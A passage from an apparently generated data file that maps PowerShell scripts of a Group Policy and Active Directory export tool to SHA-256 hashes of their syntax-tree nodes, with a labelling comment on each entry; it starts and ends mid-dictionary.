        "321": "7dfc585d520bce7059698756428dbaa22b1e4c190845a1113d40d69a79526577",
        # [51/8] AssignmentStatementAst: copiedCount
        "322": "4e8ed5b26a1625cc1041bb657af68ac7751e5b22e7445730be6387e758d4ef35",
        # [51/8/0] PipelineAst: Get-ChildItem
        "323": "bc3ad710d1bd368c56efdbc05f72188eb9ab3cb5744fe50d9b9204b483d1405e",
        # [51/9] IfStatementAst: policyFolders
        "324": "829dccd49f5e26418c75919fbcf1ce6cdaa187633a6cc20f0f8591753357e7b3",
        # [51/9/0] AssignmentStatementAst: detail
        "325": "6df47b5bc80df5fd76e92d3055160cab5601ff628357e5a73e080dd271cc8b8f",
        # [51/9/0/0] PipelineAst: enumerated 0 policy folders at $src
        "326": "e8169ba7fcbe4a31f49cac03cf4ee507ea696ab690d19129a178e37ad672c601",
        # [51/9/0/0/0] IfStatementAst: srcErr
        "327": "57a022d29d68f51864f0c8231ad961747b4b79ec598bc3a6eddec738c7ab11a0",
        # [51/9/0/0/0/0] PipelineAst:  ($($srcErr[0].Exception.Message))
        "328": "76b98af5b2bbe5c082fea9eb4f5a04f8d715d57214a438136d0b3043a4e1d24e",
        # [51/9/0/0/0/0/0] PipelineAst: srcErr
        "329": "ad17411f80f0218fb047edfcc2e3a3f1c3733ff2e5d0b2f8d6569559ee0bb2b0",
        # [51/9/0/0/0/0] PipelineAst:
        "330": "a24940325b91572b8472b1d1e7ff43c3bea7f7cec14df17bc40fd13863b2e813",
        # [51/9/0/0] PipelineAst: copy wrote 0 files to SYSVOL-Policies
        "331": "6e9af26941aa79ec229cdf1c851473e1265ad8e7d9c8171594e147302648563c",
        # [51/9/1] PipelineAst: failedSections
        "332": "6d3d19ad9fb92f38a36bab4e97cc2cc94c8dc62ba17ea47ba28648165f889497",
        # [51/9/2] PipelineAst: collectionErrors
        "333": "feb17c25eecfa220ef87219fe6b4251b5a5d91fc499990dc05e663eb157fa428",
        # [51/9/3] PipelineAst: collectionErrors
        "334": "58d3118e611170c698416f5d497aba4524b7893956fb0f354c4ac3087eff7eea",
        # [51/9/4] PipelineAst: Write-Warning
        "335": "b68c08204e44af37b07995fdde4fdf61d0883993592421ecd6c9b3ef25241092",
        # [51/9/0] PipelineAst: successSections
        "336": "ccbb5f74230cc38fe4dab63f69cf0aac8df53c3860e36ce66e4da494052df740",
        # [51/9/0] PipelineAst: failedSections
        "337": "b3c9534a3d18d8a90c5f8f49d3be49a699d470fa65f2dd500bca6417243ab7d7",
        # [51/9/1] PipelineAst: collectionErrors
        "338": "58d3118e611170c698416f5d497aba4524b7893956fb0f354c4ac3087eff7eea",
        # [52] PipelineAst: Write-Progress
        "339": "8f5ef061eae71a4833fb6dfd9cfafe76c74f3d7d159ff54ff0d3ef89ba28642f",
        # [53] PipelineAst: Write-Host
        "340": "65371da5c4016122a4e06caa19e02d4e152b4c8a7afdbde79b6c67e9b9d7a913",
        # [53/0] PipelineAst: successSections
        "341": "e85f540ccb09092aabc9bb845be4bc5427980743f66bfacecec51ee14b7c6c7e",
        # [54] ForEachStatementAst: s
        "342": "469d2b9d797dcdcbe6d03bba0c13135bb2efcefa74fc6aa9130c055d256e0556",
        # [54/0] PipelineAst: Write-Host
        "343": "77c9a29440c807b3c9a6ddd508703024ffde7436d5f1f6172c88eee3fa52c7cd",
        # [55] IfStatementAst: failedSections
        "344": "7475e5ad9c8f7624d22673859952743181d09cdc1bad8d888f8799012669e748",
        # [55/0] PipelineAst: Write-Host
        "345": "95c829e93ed1525aa1b72b29bc2dbe6643d51b19ca0077d96b0afbf1693a496f",
        # [55/0/0] PipelineAst: failedSections
        "346": "640b1cc8f47c6601abf3afd36f2c0af4e8c486d5d07887f2872893e5e987a87e",
        # [55/1] ForEachStatementAst: s
        "347": "db50a01eba0c4974ca8bd2a3e72fe0d75924c0a1a69599ee36eab74d2bcdcb57",
        # [55/1/0] PipelineAst: Write-Host
        "348": "77c9a29440c807b3c9a6ddd508703024ffde7436d5f1f6172c88eee3fa52c7cd",
        # [55/0] PipelineAst: Write-Host
        "349": "15a6187d4cffb9592b96eae904311f7376b6abaa3fab8542545561e0546b626d",
        # [56] IfStatementAst: NoZip
        "350": "00257924524440b932fa431251b1ee75ae4abc3156d743cdb45406af95eb569b",
        # [56/0] PipelineAst: New-GpoExportZip
        "351": "fb24a0dc21f2107eb0e8e1d4c1fadde557ad80eed92cab5ecd635073ad1803ab",
    },
    "Export-GroupMembers.ps1": {
        # [0] AssignmentStatementAst: ErrorActionPreference
        "0": "377020eb96957a66bcf052c8123be641902cb0ebb4315a09718a476a4ca5aa59",
        # [1] AssignmentStatementAst: adParams
        "1": "5fb55f4f1e35dcdd64eed6350220156341e7ebed31de092c56bc6e012a6a78a6",
        # [2] IfStatementAst: Credential
        "2": "1046d54b2e615698c5d3cd275f9dbe08010a78c79cd845f10a4dbe428bab3426",
        # [2/0] AssignmentStatementAst: adParams
        "3": "cfe7ee3085729be94a49074d0247fd6dceaee1fcb4152ef6f4a75d1bdd5ae0c8",
        # [3] AssignmentStatementAst: principalsData
        "4": "87f540262e6e592fc7e879c376946045dacf942ec4f994415209ab56c5b2e9a9",
        # [4] AssignmentStatementAst: groups
        "5": "4434843455817bc8bb74e50a7e95e96e9c8b55b1db8b6e8158e65180046b370f",
        # [4/0] PipelineAst: _
        "6": "3655c9c52ec4b8fd3b45c4e75e81dd1340886d1c263b52050da56a7220308358",
        # [5] PipelineAst: Write-Host
        "7": "2cd84bad3c08f4427d95cbfa1a37423275e3a239e7fd485ee93d3235cd530e85",
        # [5/0] PipelineAst: groups
        "8": "26f54cb614141938a18a4cb7b958de14a15671d50cf9eb84d4ae8a9982212d91",
        # [6] AssignmentStatementAst: groupMembers
        "9": "4a5145284b8293819d9f1e7ec9cf81afcd878923dae0c02323c852c91a7d21f0",
        # [7] AssignmentStatementAst: expanded
        "10": "173c84b5b8483ed717b628e68881ecb0921524a2a49cf2ff4710ef099e7f71f7",
        # [8] AssignmentStatementAst: failed
        "11": "6af884884fcf2c5f2a8487b8871cead20c785f93cf93524958364ef12d1c0ba0",
        # [9] ForEachStatementAst: grp
        "12": "711a4fbb2b762f05f42b47b673ee3ac22212dea836a916661ed7107f9eded561",
        # [9/0] AssignmentStatementAst: sid
        "13": "d22e8395afae13d4cd59d685ea0f5461aef3a489d65060d16edf5e4a1c956403",
        # [9/1] AssignmentStatementAst: name
        "14": "e1dcd5a65c16e85baeb52aad0932c5836ad8079075b00622718b4b3b0fe2b7ed",
        # [9/2] PipelineAst: Write-Host
        "15": "b8769a04130b71906607bf52ed8ed00b0955fc167c6c41b168e57b18d567399b",
        # [9/3] TryStatementAst: members
        "16": "a3227d0648ebdda522f1ffe8ce54bd6d7315fcbee663a8043801994ff3062b36",
        # [9/3/0] AssignmentStatementAst: members
        "17": "d3d445e8b16a1e7f251c817e469b84b83633cb07dc4dcdaef51f222eb69c23dc",
        # [9/3/1] AssignmentStatementAst: memberSids
        "18": "0b5bd76e508a45e9b094b8b6f71ef292c6c7c5f9923d69add85fb97dd6115705",
        # [9/3/2] ForEachStatementAst: m
        "19": "31c920cf4c7b300e3fa6c2b8348d7d0b929145e1ceff55a865c718783c297759",
        # [9/3/2/0] IfStatementAst: m
        "20": "59661256ed1cdcb8990ff1ec9bf87dd0c194fd6622f011f4ae3f133843a0af10",
        # [9/3/2/0/0] AssignmentStatementAst: memberSids
        "21": "e3ea9577e0451e7d07d9ec91a4101289a5a2a1e60b8d963e5ef39bd7c2db414c",
        # [9/3/3] AssignmentStatementAst: groupMembers
        "22": "b5174cbcad2c963072314a794788e755b32f7d05592a0dd3324bd081783d9960",
        # [9/3/4] PipelineAst: expanded
        "23": "1242cca0d6e6944c0bfe3fa348bc5fd2ffec269cd4e90dd73b932fe64f3e593a",
        # [9/3/5] PipelineAst: Write-Host
        "24": "bbcb345500fa3fb7c89e15b2863cde25c04e6d25de8932762383e6dd09a45619",
        # [9/3/5/0] PipelineAst: memberSids
        "25": "53afe4068666cae9bbc4e2674e9d0677a6dff295dceb68252c8d6c4645a96c96",
        # [9/3/0] PipelineAst: Write-Host
        "26": "8ebf2c52adc9baebd56ce9943cb1f229f03f5be441fb9a4a280f5c7ffc467402",
        # [9/3/0/0] PipelineAst: _
        "27": "589780c5d638ed38167c3c2c437335771db3e1128cfbcc5a8a827584a6a29e16",
        # [9/3/1] AssignmentStatementAst: groupMembers
        "28": "f22a12f99e70e57bc1615c5fe0b74d863474f217b7e7d454e674a4b1d68d7645",
        # [9/3/2] PipelineAst: failed
        "29": "0bfe1032229e59ac09f80fcde8a82a5177f533091c4782b991616960d269b540",
        # [10] AssignmentStatementAst: groupMembers
        "30": "50f6791e1299279fc172eea3b2b653bf159221c877413f80701ce7759b67ea86",
        # [11] AssignmentStatementAst: groupMembers
        "31": "1c836ec81fecb63f200ca4496315cf171e30d2d22120d640422fb7b95fb8d944",
        # [12] AssignmentStatementAst: out
        "32": "7b4955f4594b8db5076e1c0c0c973e101e8007beea1a025935ffb1e9f1cc2d4a",
        # [13] PipelineAst: out
        "33": "1dc81e1606f86ddf3d86893024f01af5796d3ff9fb0b8b9b5afa3198733b0a89",
        # [14] PipelineAst: Write-Host
        "34": "79902daf64a5a13d95ec2f40a669fd984112e822ab091c8564fdd2a00416afa8",
    },
    "Export-Principals.ps1": {
        # [0] AssignmentStatementAst: ErrorActionPreference
        "0": "377020eb96957a66bcf052c8123be641902cb0ebb4315a09718a476a4ca5aa59",
        # [1] AssignmentStatementAst: allSids
        "1": "17fc9a6cb9a265ff9e8fb2c6659cced3752ae43d6f5a3fd13faffcdd79559b33",
        # [2] IfStatementAst: SddlSource
        "2": "2727dda49022e853be461a3ad4bbde0bfb28163a42917d9c03f0f1dc64a45a0e",
        # [2/0] PipelineAst: Write-Host
        "3": "a64dfb9a1ba6216e96fbdcdbd2d2f38357de697d27acd8eb22cd8720f780b107",
        # [2/1] AssignmentStatementAst: xmlFiles
        "4": "4487f2f8c9643903e97258b1daf49e772773dc18fdd51574c876105bf521bae5",
        # [2/2] AssignmentStatementAst: allXml
        "5": "908080224acd1ddbc68345389360aa82ddfec77d2b43008cff6c3957eda79f33",
        # [2/3] IfStatementAst: Test-Path
        "6": "e1f4a54e13ecb07141d72adc8fba17adb2506fc1a620b393419d38a47f7f9b2b",
        # [2/3/0] AssignmentStatementAst: xmlFiles
        "7": "72525f76957843629dd1be31c6625804c50200bd992b080813b1e4a5f193422f",
        # [2/4] AssignmentStatementAst: reportsDir
        "8": "a99d848d6fb3a87be3f4c8f683833fed6d34efdfe788ac7f0142c6935ce21870",
        # [2/5] IfStatementAst: Test-Path
        "9": "f6713e2d9c4ae4a6ae059fc7d57a71da038c0974b1311419eb293537bdabf824",
        # [2/5/0] AssignmentStatementAst: xmlFiles
        "10": "53ae66d467cd19e7e7afd1958aa1bca1527af43d9182dc440c2ee099ccf4f554",
        # [2/6] ForEachStatementAst: f
        "11": "29f01919b075236fb20f8584ad2c4867f85f3792b5e253bc60aeccafdaf6bf08",
        # [2/6/0] TryStatementAst: content
        "12": "37264bca9b301d16eb55f1910b84e72f69ae011c0ac4310760ef43b5062a7896",
        # [2/6/0/0] AssignmentStatementAst: content
        "13": "4d282ba6b4e2c14e816d41a4ba51e05c2c41d449827afb7f92688adf5190440e",
        # [2/6/0/1] AssignmentStatementAst: matches
        "14": "6198f28bdb55a881a0fd337acbf67653f324fd511bd4d78026ba40a9caec8f8a",
        # [2/6/0/2] ForEachStatementAst: m
        "15": "ed18654f0926f2cf2cde5b60a83dc2e079c9ffd081167a6b15fe27a6c35870f1",
        # [2/6/0/2/0] PipelineAst: allSids
        "16": "282058b1388bdc490208a1506c143a6cc12c22b7ad5144517ceaf1b764c506d4",
        # [2/7] AssignmentStatementAst: metaFile
        "17": "b4ae35ba45b49d9fe60896f76b37a841b2a5db08bdd6784d73bb783178896e4e",
        # [2/8] IfStatementAst: Test-Path
        "18": "b01e71333f9fdb772c559669b609a236e66cfe12575eae48470d2b0cdc43f0f6",
        # [2/8/0] TryStatementAst: content
        "19": "1663cbbcc71f9b3a5c5ba32ce84712b12fa036fbdc118367ff3d2d2edf26c069",
        # [2/8/0/0] AssignmentStatementAst: content
        "20": "318926dc3822ac8533fdc2fb4b565ced0e5a93207ea1cecd71d9e0a06d711cc8",
        # [2/8/0/1] AssignmentStatementAst: matches
        "21": "6198f28bdb55a881a0fd337acbf67653f324fd511bd4d78026ba40a9caec8f8a",
        # [2/8/0/2] ForEachStatementAst: m
        "22": "ed18654f0926f2cf2cde5b60a83dc2e079c9ffd081167a6b15fe27a6c35870f1",
        # [2/8/0/2/0] PipelineAst: allSids
        "23": "282058b1388bdc490208a1506c143a6cc12c22b7ad5144517ceaf1b764c506d4",
        # [2/0] PipelineAst: Write-Host
        "24": "e52eaffc4a642ef0b9ff33841307a843c34721286679c4f0bd62faf2908260b2",
        # [2/1] AssignmentStatementAst: adParams
        "25": "5fb55f4f1e35dcdd64eed6350220156341e7ebed31de092c56bc6e012a6a78a6",
        # [2/2] IfStatementAst: Credential
        "26": "1046d54b2e615698c5d3cd275f9dbe08010a78c79cd845f10a4dbe428bab3426",
        # [2/2/0] AssignmentStatementAst: adParams
        "27": "cfe7ee3085729be94a49074d0247fd6dceaee1fcb4152ef6f4a75d1bdd5ae0c8",
        # [2/3] AssignmentStatementAst: dom
        "28": "dbfdc42738a62234b0d5e0fac6a4b7f70ab4f9932b430e4cb86263960646f173",
        # [2/4] AssignmentStatementAst: policiesDN
        "29": "0b252c762e43df9a93951c033885eada51c82d382b8d17851b51de638402820d",
        # [2/4/0] PipelineAst: dom
        "30": "eba48f075999db2cc5ebff1cffff652e45790e7354d437d3ea401cbaba38589e",
        # [2/5] AssignmentStatementAst: gpcObjs
        "31": "ed813a6073a3562d1637475720ec8701866cf4fa3d89d59f3e1c3f00b56e1e47",
        # [2/6] ForEachStatementAst: gpc
        "32": "5ef7870fe98fc22b6444851e954787b0913af5d90522606dc6c6a6fe490e89ce",
        # [2/6/0] TryStatementAst: sd
        "33": "f5d307c2d291fba24e6adc0e09a868c7c92a58758a9d69ae296b05937edf57e4",
        # [2/6/0/0] AssignmentStatementAst: sd
        "34": "095e2f83d350f1bcb03e12b37c6f0ef1926696a6c0e5672e1ec31ee4d1afe455",
        # [2/6/0/1] IfStatementAst: sd
        "35": "40b2112139fcdf25f35a25ff21f13b45c6e5ab966b0762191d8457e5666bda5e",
        # [2/6/0/1/0] AssignmentStatementAst: sddl
        "36": "7b4374fe74cbddcdb79a8d9d98812de31d495b29989a4ebd71188f63c11a5860",
        # [2/6/0/1/1] AssignmentStatementAst: matches
        "37": "9a0a1dfce37c5a529cb3fca7a108271ad73bd1a42ec6f7010b93fdf210666916",
        # [2/6/0/1/2] ForEachStatementAst: m
        "38": "ed18654f0926f2cf2cde5b60a83dc2e079c9ffd081167a6b15fe27a6c35870f1",
        # [2/6/0/1/2/0] PipelineAst: allSids
        "39": "282058b1388bdc490208a1506c143a6cc12c22b7ad5144517ceaf1b764c506d4",
        # [3] PipelineAst: Write-Host
        "40": "9919570fbbf7d37231dccf2ee97c3600ab22fab66b128f710e3307d377535b12",
        # [3/0] PipelineAst: allSids
        "41": "708a3a4d1f238c80ff8fd3e9412d0b8df22468a08d909a9af1dd519bbda682d1",
        # [4] AssignmentStatementAst: principals
        "42": "3f850de7fd6a3bf499f861661b7b26dd76886b8a64d047dac4534685a5b6a43f",
        # [5] AssignmentStatementAst: resolved
        "43": "a2855c796416d6376ce39bc70a74011445a8f695b72e31252b2833a3ece6ae91",
        # [6] AssignmentStatementAst: unresolved
        "44": "ba6d00fab9aebd124df80dbe10b94ee69eb8f76d46087d414c7fb81ff79b0845",
        # [7] ForEachStatementAst: sid
        "45": "52d82c97a1a66bd7ccc99045e39716123e8fd8ef8b3657d7d175da0265af1365",
        # [7/0] AssignmentStatementAst: name
        "46": "6768ca7bd1f4b9e6df9db3571c28560753282307a45a79bbb858869fce27bb87",
        # [7/1] AssignmentStatementAst: type
        "47": "a0d1b67931324af9c3d94be1870117fa51398758ed19b406474ea7306b348027",
        # [7/2] AssignmentStatementAst: sam
        "48": "3c1e00cc2659bd8dde79fa64312f7a54f9e3c98fc1b794cc505081740e2288d7",
        # [7/3] AssignmentStatementAst: domPart
        "49": "f247a4e196657c4cd32b2486d13b932b537a47902f4c222bcf945862e81e760f",
        # [7/4] TryStatementAst: sidObj
        "50": "2fe39647ce8ba456d34ee2a4624a7dc7a06d76b46dadd2f0997814ccb4c30eaa",
        # [7/4/0] AssignmentStatementAst: sidObj
        "51": "55f4f8ae6b91502f3c86b500f9c3c2ff2530934c61ea7f9fef0111a374c4d20c",
        # [7/4/1] AssignmentStatementAst: translated
        "52": "9d23113e9ddd203d10422ee0242d5f3a58a72260b2d32d21799634dfba8f4b0d",
        # [7/4/2] AssignmentStatementAst: name
        "53": "f905a9c8bfd11ac6e43c3a295b69c235dcd3cf15e48d8661a39f125e1d905ccf",
        # [7/4/3] IfStatementAst: translated
        "54": "052b47d76c426b8dce30f66bab5cdb3e192dbd85ebb110e5c508ab0cfc05af87",
        # [7/4/3/0] AssignmentStatementAst: domPart
        "55": "9d10171b98f89164d435ce12adadf0882a87ebdfa0f5354caa2aa7bc6986d2ac",
        # [7/4/3/1] AssignmentStatementAst: sam
        "56": "720ce55a775fc5c2474278177c1334804120dda6ecb957e214fd2e92e6e23db6",
        # [7/4/3/0] AssignmentStatementAst: sam
        "57": "728f99e7820454064658809178312dff3c0b1a4806b22043b2119bac99a95855",
        # [7/4/3/1] AssignmentStatementAst: domPart
        "58": "d32e67670228198382f51a405c437a8e6120af70a0428a222e04dedc6d916ea4",
        # [7/4/3/0] AssignmentStatementAst: sam
        "59": "a4bb4bc10f3bce0a8795eaa36300e28394a293a24365e1ec91851846fe8b1f23",
        # [7/4/4] IfStatementAst: translated
        "60": "740150f0ec91c5f7915a1f18ff2ba5757d50b11a32b95269e314250d3d2e096d",
        # [7/4/4/0] AssignmentStatementAst: type
        "61": "a9254100ba771688f6aba4531aff6014b22bd6c697f072553f53fdc3752e9630",
        # [7/4/4/0] AssignmentStatementAst: type
        "62": "ae358fcd023b6288b6af4eafd95badc4fb159ec6a9f2d1e2bc98e19ff4f6dd77",
        # [7/4/4/0/0] PipelineAst: Group
        "63": "f8abc26fc1c004b7b784e5cc0e22279dcc846230822194a9004bd5e5a817cfef",
        # [7/4/4/0/0] PipelineAst: User
        "64": "80d93db5be1ed6650982ecbe78512fbd206a719fd07de22f938658a2a1a842ed",
        # [7/4/4/1] IfStatementAst: sam
        "65": "c436d874a7d72501a3740851e6fa288decc80d8694424c3d5225a0473fabbaf2",
        # [7/4/4/1/0] AssignmentStatementAst: type
        "66": "1afb8d5369476d7fcca6a5737175b809f3ee409a4d84eff9f061a4ff1a6a755c",
        # [7/4/4/0] AssignmentStatementAst: type
        "67": "a9254100ba771688f6aba4531aff6014b22bd6c697f072553f53fdc3752e9630",
        # [7/4/5] PipelineAst: resolved
        "68": "067030bdce42bd16ab34aeaeead02900436c59a8a1f8593e5a06fbd5f2f0dfa7",
        # [7/4/6] PipelineAst: Write-Host
        "69": "8f4eba5dca7d70cfe4990b97902e6909531f7b2858804a53ca1f69a08a75cff4",
        # [7/4/0] AssignmentStatementAst: name
        "70": "b27704afca0e09a27215cceb50e560fb7839429c397cf8d1d96e47e959be2461",
        # [7/4/1] AssignmentStatementAst: type
        "71": "a0d1b67931324af9c3d94be1870117fa51398758ed19b406474ea7306b348027",
        # [7/4/2] PipelineAst: unresolved
        "72": "7cebc4ec851443769707833aeac018df2074ffd84bb8ffeb18df76885461fe87",
        # [7/4/3] PipelineAst: Write-Host
        "73": "e6cc33d67db1d6cf7eddc1242c56f5f8d1d664c7e86cd7559073fba5ae3f6096",
        # [7/5] AssignmentStatementAst: principals
        "74": "b8887f6fe37a3690c66f4d1f28b7a9e2ce04d07bd3cfeed6f03bec2ad22fc270",
        # [8] AssignmentStatementAst: domainSids
        "75": "d09e43bbfacb9d4b3c66858e64c95b3dd5281ae099afc81171674e19018c2f78",
        # [8/0] PipelineAst: allSids
        "76": "7f87facdf01018cb2e77e79917cef1a6f001a45cfe49c56d5bfd58b424b92c90",
        # [8/0/0] PipelineAst: _
        "77": "fc057a20e68dab975b4ed90e2d1913d6e1d05a8968b69a57fc31beadb9590bd7",
        # [9] IfStatementAst: domainSids
        "78": "d26d1987f70bdfe4f9b8712196109de7ac05ad3bafe0586cfcd9618835b94620",
        # [9/0] PipelineAst: Write-Host
        "79": "977bdd4d6e9e78d2d801e7ffa47dcfcb93ec245728c45c62b7d3e16cfd7caa28",
        # [9/0/0] PipelineAst: domainSids
        "80": "742db3bbe5b51800646ee0c4931047253ef25c773c67396cf8bbdf4cc9818155",
        # [9/1] AssignmentStatementAst: adParams
        "81": "5fb55f4f1e35dcdd64eed6350220156341e7ebed31de092c56bc6e012a6a78a6",
        # [9/2] IfStatementAst: Credential
        "82": "1046d54b2e615698c5d3cd275f9dbe08010a78c79cd845f10a4dbe428bab3426",
        # [9/2/0] AssignmentStatementAst: adParams
        "83": "cfe7ee3085729be94a49074d0247fd6dceaee1fcb4152ef6f4a75d1bdd5ae0c8",
        # [9/3] IfStatementAst: dom
        "84": "4d046f949b038bdedd6457bd4f159d9a7b6584c8fe44b3c03cca24ccc01b9742",
        # [9/3/0] TryStatementAst: dom
        "85": "f8f0e96ce6a6b58577a3a0f2791bdf37b7d40bc1462ffff7164d7136c3142c86",
        # [9/3/0/0] AssignmentStatementAst: dom
        "86": "dbfdc42738a62234b0d5e0fac6a4b7f70ab4f9932b430e4cb86263960646f173",
        # [9/3/0/0] AssignmentStatementAst: dom
        "87": "a56ab4d2bcd4f363c93a75cc387c2fc9087f3e50889ee1c49949eb84f305c920",
        # [9/4] ForEachStatementAst: sid
        "88": "2313c3f70dadd917027af1e77d81f508130a37f31125b05fe5f3cdc62bbf626d",
        # [9/4/0] IfStatementAst: principals
        "89": "4f2f822255ba28a2bb958ab3aa5166e53d3ad35a779e68988208939aae6c2dab",
        # [9/4/0/0] ContinueStatementAst:
        "90": "1e76c78ca730b8a66b5af042c40003c5eda9af9e714b2725bab995246ad9b6f4",
        # [9/4/1] TryStatementAst: obj
        "91": "0c58425e4c8ba561abbd6ef594d522c3c2316e0d97b9d6843d09b9668f621ee0",
        # [9/4/1/0] AssignmentStatementAst: obj
        "92": "6a3866f00b088a7cdc81b2dff30ab91d432f98b3a03da90bc2ee3395551c2f25",
        # [9/4/1/1] IfStatementAst: obj
        "93": "42a9c77a4772dc0046f3e7a31676b03785ddad9e4c94252e58605bb9de412eec",
        # [9/4/1/1/0] AssignmentStatementAst: sam
        "94": "12bef5f1c1792abaeaeaaf72e832e1538017cfef4be13ae85dd7fb236400b60f",
        # [9/4/1/1/0/0] PipelineAst: obj
        "95": "1e16b5135137b767502c56ca12b21d229de2e230654d29011ba40a3019d408dc",
        # [9/4/1/1/0/0] PipelineAst: obj
        "96": "b65614e2c04695695dd3bc123172ad2a97235b1b66aa24fc8d92e2d5a3d5e5fb",
        # [9/4/1/1/1] AssignmentStatementAst: objClass
        "97": "38aa533d205b15415aa5e72a86d53947bb2ae31c4ec5754e9ce323bf19f20094",
        # [9/4/1/1/2] AssignmentStatementAst: ptype
        "98": "b1f59cc932bd2ff3e60fbe034546a0a31f167b00e50e6190d5bf5a25c7ce0ad8",
        # [9/4/1/1/2/0] PipelineAst: Group
        "99": "2e4b394a052127c2bab96dfb7cb481f3154dc10c4cdc7483394531403fefc19c",
        # [9/4/1/1/2/0] PipelineAst: Computer
        "100": "c07ddd636bcca42d1632228059f732da2588545c3c6ee6c53577cf1b1b8160d1",
        # [9/4/1/1/2/0] PipelineAst: User
        "101": "48cb780b9fdb7a0a20d5aca250c8cedbc24296060091bfe9fa56fc3f8f1409bf",
        # [9/4/1/1/3] AssignmentStatementAst: domName
        "102": "67a8e963b6c9de67f76da482bbf1d335aab45c4d3fbfa5a10567d0f43e0799af",
        # [9/4/1/1/3/0] PipelineAst: dom
        "103": "1d94530e7bd716587dd6e3b2cff385d2c7e65322d758e74d3b3d586b5d80dd2b",
        # [9/4/1/1/3/0] PipelineAst:
        "104": "a24940325b91572b8472b1d1e7ff43c3bea7f7cec14df17bc40fd13863b2e813",
        # [9/4/1/1/4] AssignmentStatementAst: principals
        "105": "3ae6f5b74f4b678e90d7e902a6bfbda9dc33de2a4a5acb58b653112dd338ea9d",
        # [9/4/1/1/5] PipelineAst: Write-Host
        "106": "e8a953de8f44ae8337b085ccb9c40bf13cc556c22e317e1ed52640c26b2ffdcf",
        # [9/4/1/0] PipelineAst: Write-Host
        "107": "daca97c462b33e59ab57617e1b2b0ebe1391aa8555ae37ccafe40addf572d878",
        # [9/4/1/0/0] PipelineAst: _
        "108": "589780c5d638ed38167c3c2c437335771db3e1128cfbcc5a8a827584a6a29e16",
        # [10] AssignmentStatementAst: domainDns
        "109": "212304bff7b66d5b018a5774ed97f5c369e1402926a85ae7789ab4d5fb3d323b",
        # [10/0] PipelineAst: dom
        "110": "e8720f95f076b1e759f3900afa4fa1ea499a611ab2ffe4ae37c4bbecfd9682aa",
        # [10/0] PipelineAst:
        "111": "a24940325b91572b8472b1d1e7ff43c3bea7f7cec14df17bc40fd13863b2e813",
        # [11] AssignmentStatementAst: out
        "112": "f74de0ede40d8378c6b9836667c806c655276c469fd896507e1e80e4bd8db3a1",
        # [12] PipelineAst: out
        "113": "1dc81e1606f86ddf3d86893024f01af5796d3ff9fb0b8b9b5afa3198733b0a89",
        # [13] PipelineAst: Write-Host
        "114": "f56d783e16fc0c777f1ed83028a22792d0bb124da65df5acca356b69dad04d90",
    },
    "Run-GpoLensCollection.ps1": {
        # [0] PipelineAst: Join-Path
        "0": "8923ec8dd07ac8c28f1590734bb6e20f988da94cf372d9e32428fc72f39ab612",
        # [1] FunctionDefinitionAst: LogPath
        "1": "2bad6ad77649dcc5f0b2861e1608db603b658bf3148d115fb5a22076eba74bca",
        # [1/0] AssignmentStatementAst: encoding
        "2": "9c1a2a83d630e0b5161a4a295833a9014f36728ab5dce6d3503b117d3316ccc1",
        # [1/1] AssignmentStatementAst: line
        "3": "7e9e4a4332786f7ca8801394a56f06dcaf70a0309bf57ea89fc477030e245042",
        # [1/1/0] PipelineAst: Get-Date
        "4": "f63203bfe0ccb1271d074fff3c8277883380c778542dfe1025670fac7e572fd6",
        # [1/2] AssignmentStatementAst: maxChars
        "5": "ab9997f188bfd7c3cce488105b1df25fd3f1934315e8b2b9094f8fcdb85dd586",
        # [1/3] IfStatementAst: line
        "6": "a13f5ff92c30b6d8d32e044afcb50c9469c09b2df7cf90c8277190480b195675",
        # [1/3/0] AssignmentStatementAst: line
        "7": "cd6bf1e15d95c7734f009d418377fff566344371eb5b303c8e596c2674d5cb91",
        # [1/4] AssignmentStatementAst: bytes
        "8": "bfe8974e6a831ccd7e689cd154d163c1ef09bb436d54ed9f062875865b190231",
        # [1/5] IfStatementAst: Test-Path
        "9": "84da8f18c92077ee3a36fee248e7fa0e2146c46c8b981466c3cd727b57cf6804",
        # [1/5/0] ForStatementAst: i
        "10": "6d8dd46674c4953f3fb54550e10cab0fbfffd90e2f4ba53ee5e62e599cda9015",
        # [1/5/0/0] AssignmentStatementAst: old
        "11": "f45202df2edf3228e0e25a9c26ca8b73027155ca4b53cd8ea1fcaeb833f5e1d8",
        # [1/5/0/0/0] PipelineAst: LogPath
        "12": "377a48617f4c4a27c1c0736fafede8115be27567936198176e63682f1cd0f403",
        # [1/5/0/0/0] PipelineAst: $LogPath.$($i - 1)
        "13": "12b2aa818a350689b5a565db2cf3860acfd589539011ff34186d041120ade7f9",
        # [1/5/0/0/0/0] PipelineAst: i
        "14": "0cc1275cdd7022201de0cd41400873a9ac0a134c77d6e99b984a0f41d21bb40d",
        # [1/5/0/1] AssignmentStatementAst: next
        "15": "e1572d4c5e78388da828887dd33a74e614de8e639e44d02d690bbf03b5a01e1d",
        # [1/5/0/2] IfStatementAst: Test-Path
        "16": "2b6ae545164be7cb24ba6fb77cda8a0812be262e7c533bd068cb91201442069c",
        # [1/5/0/2/0] PipelineAst: Remove-Item
        "17": "1e0560a352b57ccee4ea31a09d36e6379193717c6c52564c974402b777cfad41",
        # [1/5/0/3] IfStatementAst: Test-Path
        "18": "3350124e265412a3eead1468bee84d49eae6261faaac5d0b361d0937bdfe442f",
        # [1/5/0/3/0] PipelineAst: Move-Item
        "19": "a0d495b8c5cd92daa8cff457546969eee73fe260d9bccd15fd5ac58961a46514",
        # [1/6] PipelineAst: AppendAllText
        "20": "996fdd46b7f7fcbbd83f9d160ff6953ac4ccb5042168bafd1b0a7dd8bbad7c65",
        # [2] FunctionDefinitionAst: OutputRoot
        "21": "588bc6003c0218bf0f04b0dccb8b693ada9846c3cae408094922ec115a4ed4d1",
        # [2/0] PipelineAst: Add-Type
        "22": "5bd2c377bb1eb96ee894083e32f481400bdf96f5281d9de456720b9c709f8182",
        # [2/1] AssignmentStatementAst: candidates
        "23": "a93b50d09e8540c8492e88eb14d8c4de204fbd53a432fc95a0cdcabb8cb35cbd",
        # [2/1/0] PipelineAst: Get-ChildItem
        "24": "e3f9f6a489de333484d676d9bcecc3ce724ae01bc2512214c759c59bad50900d",
        # [2/1/0/0] PipelineAst: _
        "25": "d4f94f9a3e3fdbf517d6a3812eb334e0bb408c24799c64258daeeeb1fd64491f",
        # [2/1/0/0] PipelineAst: _
        "26": "a9653cc788bb9f271563689bc162f455cc7e64e4cedc9dc68997b4bc25c2d1c0",
        # [2/2] ForEachStatementAst: archive
        "27": "d83b5298b8002e7ef2c35d545418e151f498f5e3d3a250b97d0aba30470e8245",
        # [2/2/0] AssignmentStatementAst: zip
